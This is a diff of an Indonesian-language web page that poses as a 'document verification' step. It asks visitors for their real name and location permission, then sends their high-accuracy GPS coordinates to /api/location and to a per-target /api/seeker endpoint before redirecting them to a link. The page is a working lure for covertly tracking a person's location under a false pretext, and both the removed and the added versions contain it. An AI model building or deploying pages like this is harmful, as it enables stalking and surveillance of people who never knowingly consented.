@@ -1,92 +1,80 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Verifikasi Akses</title>
+  <meta charset="UTF-8" />
+  <title>Verifikasi Link</title>
   <style>
     body {
       font-family: sans-serif;
       text-align: center;
       margin-top: 100px;
     }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      background: #000000;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    input {
+    button, input {
       padding: 10px;
-      width: 250px;
       font-size: 16px;
-      margin-bottom: 10px;
+      margin: 5px;
+    }
+    button {
+      background: #000;
+      color: white;
+      border-radius: 8px;
+      border: none;
     }
   </style>
 </head>
 <body>
-  <h2>Verifikasi Dokumen Resmi</h2>
-  <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
-  <p>Klik Allow untuk mendapatkan Link serta mencocokkan dengan server lokasi terdekat.</p>
-  <p>Mohon isi kolom dengan Nama Asli agar mudah dalam Pendataan 👍</p>
-  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/pocoyo-giphy2.gif?raw=true" alt="GiFOnline" width="400"><br>
-
-  <input type="text" id="nama" placeholder="Masukkan Nama Anda" required><br><br>
-  <button onclick="startTracking()">Dapatkan Link</button>
+  <h2>Verifikasi Akses Dokumen</h2>
+  <p>Masukkan nama dan izinkan lokasi untuk mengakses dokumen.</p>
+  <input type="text" id="nama" placeholder="Nama Asli"><br><br>
+  <button onclick="submitData()">Dapatkan Link</button>
 
   <script>
-    function startTracking() {
+    const id = new URLSearchParams(window.location.search).get("id");
+
+    function submitData() {
       const nama = document.getElementById("nama").value.trim();
-      if (!nama) {
-        alert("Nama tidak boleh kosong!");
-        return;
-      }
+      if (!nama) return alert("Nama wajib diisi.");
+
+      if (!id) return alert("ID dokumen tidak ditemukan.");
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => sendData(position, nama),
-          showError,
-          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+          (pos) => {
+            const body = {
+              nama,
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy,
+            };
+
+            // kirim ke /api/location
+            fetch("/api/location", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(body),
+            }).catch((e) => console.warn("Lokasi gagal dikirim:", e));
+
+            // kirim ke /api/seeker/[id]
+            fetch(`/api/seeker/${id}`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(body),
+            })
+              .then((res) => res.json())
+              .then((data) => {
+                if (data.redirectTo) {
+                  window.location.href = data.redirectTo;
+                } else {
+                  alert("Link tidak ditemukan.");
+                }
+              });
+          },
+          (err) => alert("Izin lokasi diperlukan. Aktifkan GPS dan izinkan akses."),
+          { enableHighAccuracy: true, timeout: 5000 }
         );
       } else {
-        alert("Browser Anda tidak mendukung GPS.");
+        alert("Browser tidak mendukung geolokasi.");
       }
-    }
-
-    function sendData(position, nama) {
-      fetch('/api/location', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          nama,
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          acc: position.coords.accuracy,
-          timestamp: new Date().toISOString()
-        })
-      })
-      .then(res => {
-        if (!res.ok) throw new Error("Gagal kirim data");
-        window.location.href = "https://drive.google.com/drive/folders/1xiz5IF0xhsMKqnol0cBrO8KWScXV7cd-?usp=sharing";
-      })
-      .catch(err => {
-        console.error("Gagal mengirim data:", err);
-        alert("Terjadi kesalahan, coba lagi.");
-      });
-    }
-
-    function showError(error) {
-      const pesan = {
-        1: "Klik 'Izinkan' agar dapat mengakses lokasi.",
-        2: "Informasi lokasi tidak tersedia.",
-        3: "Permintaan lokasi melebihi batas waktu.",
-        default: "Terjadi kesalahan tak terduga."
-      };
-      alert(pesan[error.code] || pesan.default);
     }
   </script>
 </body>
